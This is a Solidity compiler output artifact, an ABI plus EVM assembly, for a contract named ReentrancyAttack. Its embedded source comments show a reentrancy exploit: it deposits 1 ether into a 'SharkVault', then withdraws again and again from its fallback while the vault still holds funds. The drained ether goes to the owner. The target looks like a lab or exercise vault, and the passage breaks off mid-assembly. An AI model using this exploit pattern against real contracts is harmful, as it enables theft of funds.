{
	"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol": {
		"ReentrancyAttack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract SharkVault",
							"name": "_sharkVault",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "sharkVault",
					"outputs": [
						{
							"internalType": "contract SharkVault",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":86:1094  contract ReentrancyAttack {... */\n  mstore(0x40, 0x80)\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":179:284  constructor(SharkVault _sharkVault) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":238:249  _sharkVault */\n  dup1\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":225:235  sharkVault */\n  0x00\n  dup1\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":225:249  sharkVault = _sharkVault */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":267:277  msg.sender */\n  caller\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":259:264  owner */\n  0x01\n  0x00\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":259:277  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":179:284  constructor(SharkVault _sharkVault) {... */\n  pop\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":86:1094  contract ReentrancyAttack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:682   */\ntag_12:\n    /* \"#utility.yul\":623:630   */\n  0x00\n    /* \"#utility.yul\":652:676   */\n  tag_23\n    /* \"#utility.yul\":670:675   */\n  dup3\n    /* \"#utility.yul\":652:676   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":641:676   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:682   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":688:846   */\ntag_13:\n    /* \"#utility.yul\":779:821   */\n  tag_25\n    /* \"#utility.yul\":815:820   */\n  dup2\n    /* \"#utility.yul\":779:821   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":772:777   */\n  dup2\n    /* \"#utility.yul\":769:822   */\n  eq\n    /* \"#utility.yul\":759:840   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":836:837   */\n  0x00\n    /* \"#utility.yul\":833:834   */\n  dup1\n    /* \"#utility.yul\":826:838   */\n  revert\n    /* \"#utility.yul\":759:840   */\ntag_26:\n    /* \"#utility.yul\":688:846   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":852:1031   */\ntag_14:\n    /* \"#utility.yul\":927:932   */\n  0x00\n    /* \"#utility.yul\":958:964   */\n  dup2\n    /* \"#utility.yul\":952:965   */\n  mload\n    /* \"#utility.yul\":943:965   */\n  swap1\n  pop\n    /* \"#utility.yul\":974:1025   */\n  tag_28\n    /* \"#utility.yul\":1019:1024   */\n  dup2\n    /* \"#utility.yul\":974:1025   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":852:1031   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1037:1424   */\ntag_3:\n    /* \"#utility.yul\":1125:1131   */\n  0x00\n    /* \"#utility.yul\":1174:1176   */\n  0x20\n    /* \"#utility.yul\":1162:1171   */\n  dup3\n    /* \"#utility.yul\":1153:1160   */\n  dup5\n    /* \"#utility.yul\":1149:1172   */\n  sub\n    /* \"#utility.yul\":1145:1177   */\n  slt\n    /* \"#utility.yul\":1142:1261   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1180:1259   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1142:1261   */\ntag_30:\n    /* \"#utility.yul\":1300:1301   */\n  0x00\n    /* \"#utility.yul\":1325:1407   */\n  tag_32\n    /* \"#utility.yul\":1399:1406   */\n  dup5\n    /* \"#utility.yul\":1390:1396   */\n  dup3\n    /* \"#utility.yul\":1379:1388   */\n  dup6\n    /* \"#utility.yul\":1375:1397   */\n  add\n    /* \"#utility.yul\":1325:1407   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1315:1407   */\n  swap2\n  pop\n    /* \"#utility.yul\":1271:1417   */\n  pop\n    /* \"#utility.yul\":1037:1424   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":86:1094  contract ReentrancyAttack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":86:1094  contract ReentrancyAttack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7b26ad79\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":430:437  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":407:417  sharkVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":399:426  address(sharkVault).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":399:437  address(sharkVault).balance >= 1 ether */\n      lt\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":395:496  if (address(sharkVault).balance >= 1 ether) {... */\n      tag_11\n      jumpi\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":453:463  sharkVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":453:476  sharkVault.withdrawGold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9835e092\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":477:484  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":453:485  sharkVault.withdrawGold(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":395:496  if (address(sharkVault).balance >= 1 ether) {... */\n    tag_11:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":86:1094  contract ReentrancyAttack {... */\n      stop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":900:1057  function withdraw() external {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      stop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":118:146  SharkVault public sharkVault */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":152:172  address public owner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n      pop\n      tag_26\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":544:849  function attack() external payable {... */\n    tag_6:\n      tag_30\n      tag_31\n      jump\t// in\n    tag_30:\n      stop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":900:1057  function withdraw() external {... */\n    tag_19:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":961:966  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":947:966  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":947:957  msg.sender */\n      caller\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":947:966  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":939:994  require(msg.sender == owner, \"Only owner can withdraw\") */\n      tag_33\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_34\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_33:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":1012:1017  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":1004:1027  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":1004:1050  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":1028:1049  address(this).balance */\n      selfbalance\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":1004:1050  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_37:\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":900:1057  function withdraw() external {... */\n      jump\t// out\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":118:146  SharkVault public sharkVault */\n    tag_22:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":152:172  address public owner */\n    tag_27:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":544:849  function attack() external payable {... */\n    tag_31:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":610:617  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":597:606  msg.value */\n      callvalue\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":597:617  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":589:653  require(msg.value >= 1 ether, \"Need at least 1 ether to attack\") */\n      tag_39\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_40\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_39:\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":710:720  sharkVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":710:732  sharkVault.depositGold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x465a7007\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":740:747  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":749:750  0 */\n      0x00\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":710:760  sharkVault.depositGold{value: 1 ether}(0... */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_42\n      swap2\n      swap1\n      tag_43\n      jump\t// in\n    tag_42:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_44\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_44:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_46:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":810:820  sharkVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":810:833  sharkVault.withdrawGold */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9835e092\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":834:841  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":810:842  sharkVault.withdrawGold(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_47\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_47:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n        /* \"Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol\":544:849  function attack() external payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:110   */\n    tag_51:\n        /* \"#utility.yul\":70:77   */\n      0x00\n        /* \"#utility.yul\":99:104   */\n      dup2\n        /* \"#utility.yul\":88:104   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:110   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":116:193   */\n    tag_52:\n        /* \"#utility.yul\":153:160   */\n      0x00\n        /* \"#utility.yul\":182:187   */\n      dup2\n        /* \"#utility.yul\":171:187   */\n      swap1\n      pop\n        /* \"#utility.yul\":116:193   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":199:259   */\n    tag_53:\n        /* \"#utility.yul\":227:230   */\n      0x00\n        /* \"#utility.yul\":248:253   */\n      dup2\n        /* \"#utility.yul\":241:253   */\n      swap1\n      pop\n        /* \"#utility.yul\":199:259   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":265:459   */\n    tag_54:\n        /* \"#utility.yul\":341:350   */\n      0x00\n        /* \"#utility.yul\":374:453   */\n      tag_76\n        /* \"#utility.yul\":392:452   */\n      tag_77\n        /* \"#utility.yul\":401:451   */\n      tag_78\n        /* \"#utility.yul\":445:450   */\n      dup5\n        /* \"#utility.yul\":401:451   */\n      tag_51\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":392:452   */\n      tag_53\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":374:453   */\n      tag_52\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":361:453   */\n      swap1\n      pop\n        /* \"#utility.yul\":265:459   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":465:648   */\n    tag_55:\n        /* \"#utility.yul\":578:641   */\n      tag_80\n        /* \"#utility.yul\":635:640   */\n      dup2\n        /* \"#utility.yul\":578:641   */\n      tag_54\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":573:576   */\n      dup3\n        /* \"#utility.yul\":566:642   */\n      mstore\n        /* \"#utility.yul\":465:648   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":654:928   */\n    tag_13:\n        /* \"#utility.yul\":773:777   */\n      0x00\n        /* \"#utility.yul\":811:813   */\n      0x20\n        /* \"#utility.yul\":800:809   */\n      dup3\n        /* \"#utility.yul\":796:814   */\n      add\n        /* \"#utility.yul\":788:814   */\n      swap1\n      pop\n        /* \"#utility.yul\":824:921   */\n      tag_82\n        /* \"#utility.yul\":918:919   */\n      0x00\n        /* \"#utility.yul\":907:916   */\n      dup4\n        /* \"#utility.yul\":903:920   */\n      add\n        /* \"#utility.yul\":894:900   */\n      dup5\n        /* \"#utility.yul\":824:921   */\n      tag_55\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":654:928   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":934:1060   */\n    tag_56:\n        /* \"#utility.yul\":971:978   */\n      0x00\n        /* \"#utility.yul\":1011:1053   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1004:1009   */\n      dup3\n        /* \"#utility.yul\":1000:1054   */\n      and\n        /* \"#utility.yul\":989:1054   */\n      swap1\n      pop\n        /* \"#utility.yul\":934:1060   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1066:1208   */\n    tag_57:\n        /* \"#utility.yul\":1116:1125   */\n      0x00\n        /* \"#utility.yul\":1149:1202   */\n      tag_85\n        /* \"#utility.yul\":1167:1201   */\n      tag_86\n        /* \"#utility.yul\":1176:1200   */\n      tag_87\n        /* \"#utility.yul\":1194:1199   */\n      dup5\n        /* \"#utility.yul\":1176:1200   */\n      tag_56\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1167:1201   */\n      tag_53\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":1149:1202   */\n      tag_56\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1136:1202   */\n      swap1\n      pop\n        /* \"#utility.yul\":1066:1208   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1214:1340   */\n    tag_58:\n        /* \"#utility.yul\":1264:1273   */\n      0x00\n        /* \"#utility.yul\":1297:1334   */\n      tag_89\n        /* \"#utility.yul\":1328:1333   */\n      dup3\n        /* \"#utility.yul\":1297:1334   */\n      tag_57\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1284:1334   */\n      swap1\n      pop\n        /* \"#utility.yul\":1214:1340   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1346:1490   */\n    tag_59:\n        /* \"#utility.yul\":1414:1423   */\n      0x00\n        /* \"#utility.yul\":1447:1484   */\n      tag_91\n        /* \"#utility.yul\":1478:1483   */\n      dup3\n        /* \"#utility.yul\":1447:1484   */\n      tag_58\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1434:1484   */\n      swap1\n      pop\n        /* \"#utility.yul\":1346:1490   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1496:1663   */\n    tag_60:\n        /* \"#utility.yul\":1601:1656   */\n      tag_93\n        /* \"#utility.yul\":1650:1655   */\n      dup2\n        /* \"#utility.yul\":1601:1656   */\n      tag_59\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":1596:1599   */\n      dup3\n        /* \"#utility.yul\":1589:1657   */\n      mstore\n        /* \"#utility.yul\":1496:1663   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1669:1927   */\n    tag_24:\n        /* \"#utility.yul\":1780:1784   */\n      0x00\n        /* \"#utility.yul\":1818:1820   */\n      0x20\n        /* \"#utility.yul\":1807:1816   */\n      dup3\n        /* \"#utility.yul\":1803:1821   */\n      add\n        /* \"#utility.yul\":1795:1821   */\n      swap1\n      pop\n        /* \"#utility.yul\":1831:1920   */\n      tag_95\n        /* \"#utility.yul\":1917:1918   */\n      0x00\n        /* \"#utility.yul\":1906:1915   */\n      dup4\n        /* \"#utility.yul\":1902:1919   */\n      add\n        /* \"#utility.yul\":1893:1899   */\n      dup5\n        /* \"#utility.yul\":1831:1920   */\n      tag_60\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1669:1927   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1933:2029   */\n    tag_61:\n        /* \"#utility.yul\":1970:1977   */\n      0x00\n        /* \"#utility.yul\":1999:2023   */\n      tag_97\n        /* \"#utility.yul\":2017:2022   */\n      dup3\n        /* \"#utility.yul\":1999:2023   */\n      tag_56\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":1988:2023   */\n      swap1\n      pop\n        /* \"#utility.yul\":1933:2029   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2035:2153   */\n    tag_62:\n        /* \"#utility.yul\":2122:2146   */\n      tag_99\n        /* \"#utility.yul\":2140:2145   */\n      dup2\n        /* \"#utility.yul\":2122:2146   */\n      tag_61\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2117:2120   */\n      dup3\n        /* \"#utility.yul\":2110:2147   */\n      mstore\n        /* \"#utility.yul\":2035:2153   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2159:2381   */\n    tag_29:\n        /* \"#utility.yul\":2252:2256   */\n      0x00\n        /* \"#utility.yul\":2290:2292   */\n      0x20\n        /* \"#utility.yul\":2279:2288   */\n      dup3\n        /* \"#utility.yul\":2275:2293   */\n      add\n        /* \"#utility.yul\":2267:2293   */\n      swap1\n      pop\n        /* \"#utility.yul\":2303:2374   */\n      tag_101\n        /* \"#utility.yul\":2371:2372   */\n      0x00\n        /* \"#utility.yul\":2360:2369   */\n      dup4\n        /* \"#utility.yul\":2356:2373   */\n      add\n        /* \"#utility.yul\":2347:2353   */\n      dup5\n        /* \"#utility.yul\":2303:2374   */\n      tag_62\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":2159:2381   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2387:2556   */\n    tag_63:\n        /* \"#utility.yul\":2471:2482   */\n      0x00\n        /* \"#utility.yul\":2505:2511   */\n      dup3\n        /* \"#utility.yul\":2500:2503   */\n      dup3\n        /* \"#utility.yul\":2493:2512   */\n      mstore\n        /* \"#utility.yul\":2545:2549   */\n      0x20\n        /* \"#utility.yul\":2540:2543   */\n      dup3\n        /* \"#utility.yul\":2536:2550   */\n      add\n        /* \"#utility.yul\":2521:2550   */\n      swap1\n      pop\n        /* \"#utility.yul\":2387:2556   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2562:2735   */\n    tag_64:\n        /* \"#utility.yul\":2702:2727   */\n      0x4f6e6c79206f776e65722063616e207769746864726177000000000000000000\n        /* \"#utility.yul\":2698:2699   */\n      0x00\n        /* \"#utility.yul\":2690:2696   */\n      dup3\n        /* \"#utility.yul\":2686:2700   */\n      add\n        /* \"#utility.yul\":2679:2728   */\n      mstore\n        /* \"#utility.yul\":2562:2735   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2741:3107   */\n    tag_65:\n        /* \"#utility.yul\":2883:2886   */\n      0x00\n        /* \"#utility.yul\":2904:2971   */\n      tag_105\n        /* \"#utility.yul\":2968:2970   */\n      0x17\n        /* \"#utility.yul\":2963:2966   */\n      dup4\n        /* \"#utility.yul\":2904:2971   */\n      tag_63\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":2897:2971   */\n      swap2\n      pop\n        /* \"#utility.yul\":2980:3073   */\n      